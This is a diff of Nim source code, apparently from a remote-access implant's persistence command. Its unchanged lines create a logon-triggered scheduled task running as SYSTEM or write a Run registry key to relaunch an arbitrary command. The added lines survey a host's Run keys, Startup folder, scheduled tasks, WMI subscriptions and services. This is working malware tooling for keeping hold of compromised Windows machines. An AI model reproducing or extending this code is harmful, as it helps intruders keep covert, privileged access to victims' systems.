@@ -2067,6 +2067,21 @@ proc doPersist(name, cmd, meth: string): string =
     if meth == "schtask":
       return runShell("schtasks /create /tn \"" & name & "\" /tr \"" & cmd &
         "\" /sc ONLOGON /ru SYSTEM /f 2>&1")
+    elif meth in ["enum", "check", "list"]:
+      var out2 = "[*] Scanning persistence mechanisms...\n\n"
+      out2.add("[HKCU Run]\n")
+      out2.add(runShell("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1") & "\n")
+      out2.add("[HKLM Run]\n")
+      out2.add(runShell("reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1") & "\n")
+      out2.add("[Startup Folder]\n")
+      out2.add(runShell("dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" 2>&1") & "\n")
+      out2.add("[Scheduled Tasks]\n")
+      out2.add(runShell("schtasks /query /fo TABLE /nh 2>&1") & "\n")
+      out2.add("[WMI Subscriptions]\n")
+      out2.add(runShell("wmic /namespace:\\\\root\\subscription PATH __EventFilter get Name 2>&1") & "\n")
+      out2.add("[Services (all)]\n")
+      out2.add(runShell("sc query type= all state= all 2>&1") & "\n")
+      return out2
     return runShell("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" &
       name & "\" /t REG_SZ /d \"" & cmd & "\" /f 2>&1")
   else:
